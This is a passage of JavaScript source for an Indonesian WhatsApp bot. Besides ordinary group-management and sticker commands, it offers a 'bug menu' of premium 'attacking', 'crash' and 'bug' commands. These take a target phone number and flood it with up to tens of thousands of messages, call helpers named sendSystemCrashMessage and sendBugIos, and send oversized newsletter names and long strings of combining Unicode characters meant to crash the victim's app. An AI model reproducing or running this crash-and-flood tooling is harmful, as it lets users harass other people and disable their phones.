⭔ ${prefix}groupmenu
⭔ ${prefix}aksesmenu
⭔ ${prefix}settingsmenu
⭔ ${prefix}cekbot

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'bugmenu': case 'menubug': 
{
replyz(
`\`BUG MENU BY DIKA ID\`
⭔ ${prefix}bugchat-v1
⭔ ${prefix}bugchat-v2
⭔ ${prefix}bugchat-v3
⭔ ${prefix}bugemoji
⭔ ${prefix}bugspesial
⭔ ${prefix}buggacorin
⭔ ${prefix}buginplace

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'bugchat-v1': 
{
replyz(
`\`BUG CHAT V1 BY DIKA ID\`
⭔ ${prefix}attacking-v1 628xxx
⭔ ${prefix}attacking-v2 628xxx
⭔ ${prefix}attacking-v3 628xxx
⭔ ${prefix}attacking-v4 628xxx
⭔ ${prefix}attacking-v5 628xxx

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'bugchat-v2': 
{
replyz(
`\`BUG CHAT V2 BY DIKA ID\`
⭔ ${prefix}external-v1 628xxx
⭔ ${prefix}external-v2 628xxx
⭔ ${prefix}external-v3 628xxx
⭔ ${prefix}external-v4 628xxx
⭔ ${prefix}external-v5 628xxx
⭔ ${prefix}internal-v1 628xxx
⭔ ${prefix}internal-v2 628xxx
⭔ ${prefix}internal-v3 628xxx
⭔ ${prefix}internal-v4 628xxx
⭔ ${prefix}internal-v5 628xxx

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'bugchat-v3': 
{
replyz(
`\`BUG CHAT V3 BY DIKA ID\`
⭔ ${prefix}dikasigma-v1 628xxx
⭔ ${prefix}dikasigma-v2 628xxx
⭔ ${prefix}dikasigma-v3 628xxx
⭔ ${prefix}dikasigma-v4 628xxx
⭔ ${prefix}dikasigma-v5 628xxx

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'bugemoji': 
{
replyz(
`\`BUG EMOJI BY DIKA ID\`
⭔ ${prefix}🌷 628xxx
⭔ ${prefix}🌹 628xxx
⭔ ${prefix}🥀 628xxx
⭔ ${prefix}💐 628xxx
⭔ ${prefix}🌼 628xxx
⭔ ${prefix}💙 628xxx
⭔ ${prefix}🤎 628xxx
⭔ ${prefix}💖 628xxx
⭔ ${prefix}💛 628xxx
⭔ ${prefix}🖤 628xxx

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'bugspesial': 
case 'bugvvip': 
{
replyz(
`\`BUG SPESIAL BY DIKA ID\`
⭔ ${prefix}spesialbug-v1 628xxx
⭔ ${prefix}spesialbug-v2 628xxx
⭔ ${prefix}spesialbug-v3 628xxx
⭔ ${prefix}spesialbug-v4 628xxx
⭔ ${prefix}spesialbug-v5 628xxx
⭔ ${prefix}vvipcrash-v1 628xxx
⭔ ${prefix}vvipcrash-v2 628xxx
⭔ ${prefix}vvipcrash-v3 628xxx
⭔ ${prefix}vvipcrash-v4 628xxx
⭔ ${prefix}vvipcrash-v5 628xxx

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'buggacorin': 
{
replyz(
`\`BUG GACORIN BY DIKA ID\`
⭔ ${prefix}dikagacor-v1 628xxx
⭔ ${prefix}dikagacor-v2 628xxx
⭔ ${prefix}dikagacor-v3 628xxx
⭔ ${prefix}dikagacor-v4 628xxx
⭔ ${prefix}dikagacor-v5 628xxx

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'buginplace': 
case 'bugditempat': 
{
replyz(
`\`BUG IN PLACE BY DIKA ID\`
⭔ ${prefix}halo_bang
⭔ ${prefix}save_dika
⭔ ${prefix}done_cuy

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'groupmenu': 
case 'menugroup': 
case 'grupmenu': 
case 'menugrup': 
{
replyz(
`\`BUG MENU BY DIKA ID\`
⭔ ${prefix}bugchat-v1
⭔ ${prefix}bugchat-v2
⭔ ${prefix}bugchat-v3
⭔ ${prefix}bugemoji
⭔ ${prefix}bugspesial
⭔ ${prefix}buggacorin
⭔ ${prefix}buginplace

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'aksesmenu': 
case 'menuakses': 
{
replyz(
`\`AKSES MENU BY DIKA ID\`
⭔ ${prefix}addowner 628xxx
⭔ ${prefix}delowner 628xxx
⭔ ${prefix}addpremium 628xxx
⭔ ${prefix}delpremium 628xxx
⭔ ${prefix}blok 628xxx
⭔ ${prefix}unblok 628xxx
⭔ ${prefix}listowner
⭔ ${prefix}listpremium

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'settingsmenu': 
case 'menusettings': 
{
replyz(
`\`SETTINGS MENU BY DIKA ID\`
⭔ ${prefix}self
⭔ ${prefix}public
⭔ ${prefix}setppbot
⭔ ${prefix}setppbot /full

\`OWNER BY\` ${global.owner}`
)
}
break
//===================================
case 'addowner': case 'addown':
if (!isCreator) return replyz(global.spesialown)
if (!args[0]) return replyz(`Penggunaan ${prefix+command} Contoh ${prefix+command} 6283841442290`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await dikabot.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return replyz(`Masukkan nomor yang valid dan daftar di WhatsApp!`)
owner.push(bnnd)
Premium.push(bnnd)
fs.writeFileSync('./lib/database/owner.json', JSON.stringify(owner))
fs.writeFileSync('./lib/database/premium.json', JSON.stringify(Premium))
replyz(`Nomor ${bnnd} telah di hapus dalam database owner!`)
break
//===================================
case 'delowner': case 'delown':
if (!isCreator) return replyz(global.spesialown)
if (!args[0]) return replyz(`Penggunaan ${prefix+command} Contoh:\n ${prefix+command} 6283841442290`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
anp = Premium.indexOf(yaki)
owner.splice(unp, 1)
Premium.splice(anp, 1)
fs.writeFileSync('./lib/database/owner.json', JSON.stringify(owner))
fs.writeFileSync('./lib/database/premium.json', JSON.stringify(Premium))
replyz(`Nomor ${yaki} telah di hapus dalam database owner!`)
break
//===================================
case 'addpremium': case 'addprem':
if (!isCreator) return replyz(global.spesialown)
if (!args[0]) return replyz(`Penggunaan ${prefix+command} Contoh ${prefix+command} 6283841442290`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let cekkanbre = await dikabot.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekkanbre.length == 0) return replyz(`Masukkan nomor yang valid dan daftar di WhatsApp!`)
Premium.push(bnnd)
fs.writeFileSync('./lib/database/premium.json', JSON.stringify(Premium))
replyz(`Nomor ${bnnd} telah di tambahkan dalam database premium!`)
break
//===================================
case 'delpremium': case 'delprem':
if (!isCreator) return replyz(global.spesialown)
if (!args[0]) return replyz(`Penggunaan ${prefix+command} Contoh ${prefix+command} 6283841442290`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = Premium.indexOf(yaki)
Premium.splice(unp, 1)
fs.writeFileSync('./lib/database/premium.json', JSON.stringify(Premium))
replyz(`Nomor ${yaki} telah di hapus dalam database premium!`)
break
//===================================
case 'listowner': case 'listown':
if (!isCreator) return replyz(global.spesialown)
teksooo = '*List Owner*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
dikabot.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break
//===================================
case 'listpremium': case 'listprem':
if (!isCreator) return replyz(global.spesialown)
teksooo = '*List Premium*\n\n'
for (let i of Premium) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${Premium.length}*`
dikabot.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted:m, contextInfo: { "mentionedJid": Premium } })
break
//===================================
case 'hidetag': {
if (!isCreator) return replyz(global.spesialown)
if (!m.isGroup) return replyz(global.noingroup)
await loading()
dikabot.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break
//===================================
case 'kick': {
if (!isCreator) return replyz(global.spesialown)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dikabot.groupParticipantsUpdate(from, [users], 'remove')
}
break
//===================================
case 'add': {
if (!isCreator) return replyz(global.spesialown)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dikabot.groupParticipantsUpdate(from, [users], 'add')
}
break
//===================================
case 'promote': {
if (!isCreator) return replyz(global.spesialown)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dikabot.groupParticipantsUpdate(from, [users], 'promote')
}
break
//===================================
case 'demote': {
if (!isCreator) return replyz(global.spesialown)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dikabot.groupParticipantsUpdate(from, [users], 'demote')
}
break
//===================================
case 'editsubjek': {
if (!isCreator) return replyz(global.spesialown)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
if (!qtext) return replyz(global.notext)
await loading()
await dikabot.groupUpdateSubject(from, qtext)
}
break
//===================================
case 'editdesk':{
if (!isCreator) return replyz(global.spesialown)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
if (!qtext) return replyz(global.notext)
await loading()
await dikabot.groupUpdateDescription(from, qtext)
}
break
//===================================
case 'linkgroup': case 'linkgc': {
if (!isCreator) return replyz(global.spesialown)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
await loading()
let responsegg = await dikabot.groupInviteCode(from)
dikabot.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//===================================
case 'resetlinkgc':
if (!isCreator) return replyz(global.spesialown)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
await loading()
dikabot.groupRevokeInvite(from)
break
//===================================
case 'public': {
if (!isCreator) return replyz(global.spesialown)
dikabot.public = true
replyz('Sukses mengubah bot manjadi Public')
}
break
//===================================
case 'self': {
if (!isCreator) return replyz(global.spesialown)
dikabot.public = false
replyz('Sukses mengubah bot manjadi Self')
}
break
//===================================
case 'sticker': case 's':
 if (!quoted) return replyz(`balas foto/video dengan caption ${prefix + command}`)
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await dikabot.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyz('maximal 10 detik')
let media = await quoted.download()
let encmedia = await dikabot.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
return replyz(`Kirim foto/video dengan caption ${prefix + command}\nvideo berdurasi 1-9 detik`)
}
break
//===================================
case 'setppbot': case 'setbotpp': {
if (!isCreator) return replyz(global.spesialown)
if (!quoted) return replyz(`kirim/balas foto dengan caption ${prefix + command}`)
if (!/image/.test(mime)) return replyz(`kirim/balas foto dengan caption ${prefix + command}`)
if (/webp/.test(mime)) return replyz(`kirim/balas foto dengan caption ${prefix + command}`)
var medis = await dikabot.downloadAndSaveMediaMessage(quoted)
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await dikabot.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replyz(`Sukses`)
} else {
var memeg = await dikabot.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replyz(`Sukses`)
}
}
break
//===================================
case 'attacking-v1': 
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz('masukkan nomor target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 50
sendVariousMessages(Pe, jumlah)
sendVariousMessages(Pe, jumlah)
sendVariousMessages(Pe, jumlah)
sendVariousMessages(Pe, jumlah)
await sleep(500)
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'halo_bang': 
if (!isPremium) return replyz(global.spesialprem)
jumlah = 50
sendVariousMessages(from, jumlah)
sendVariousMessages(from, jumlah)
await sleep(500)
replyz(`Sukses mengirim bug ${command} di tempat`)
break
//===================================
case 'attacking-v2':
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz('masukkan nomor target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 50
sendRepeatedMessages2(Pe, jumlah)
sendRepeatedMessages2(Pe, jumlah)
sendRepeatedMessages2(Pe, jumlah)
sendRepeatedMessages2(Pe, jumlah)
await sleep(500)
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'save_dika': case 'done_cuy': 
if (!isPremium) return replyz(global.spesialprem)
jumlah = 50
sendRepeatedMessages2(from, jumlah)
sendVariousMessages(from, jumlah)
await sleep(500)
replyz(`Sukses mengirim bug ${command} di tempat`)
break
//===================================
case 'attacking-v3':
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz('masukkan nomor target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 1000
sendVariousMessages(Pe, jumlah)
await sleep(500)
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'attacking-v4':
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz('masukkan nomor target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 21600
sendVariousMessages(Pe, jumlah)
sendRepeatedMessages2(Pe, jumlah)
sendVariousMessages(Pe, jumlah)
sendRepeatedMessages2(Pe, jumlah)
await sleep(500)
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'attacking-v5': {
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz('masukkan nomor target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await dikabot.sendMessage(Pe, { text: '𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(500)
await dikabot.sendMessage(Pe, { react: { text: '😜', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
//===================================
case 'external-v1': case 'external-v2': case 'external-v3': case 'external-v4': case 'external-v5':case 'internal-v1': case 'internal-v2': case 'internal-v3': case 'internal-v4': case 'internal-v5':
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
dikabot.sendMessage(Pe, {text: `ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛̘𞋬𞋬𞋬𞋬𞋬𞋬𞋬`}, {quoted: force})
await sleep(500)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
dikabot.sendMessage(Pe, {text: `ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛̘𞋬𞋬𞋬𞋬𞋬𞋬𞋬`}, {quoted: force})
await sleep(500)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
dikabot.sendMessage(Pe, {text: `ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛̘𞋬𞋬𞋬𞋬𞋬𞋬𞋬`}, {quoted: force})
await sleep(500)
}
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'dikagacor-v1':
if (!isPremium) return replyz(global.spesialprem)
if (!q) return replyz(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
await sendSystemCrashMessage(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(500)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(500)
}
replyz(`Sukses mengirim bug ${command} ke nomor ${Pe}`)
break
//===================================
case 'dikagacor-v2':
if (!isPremium) return replyz(global.spesialprem)
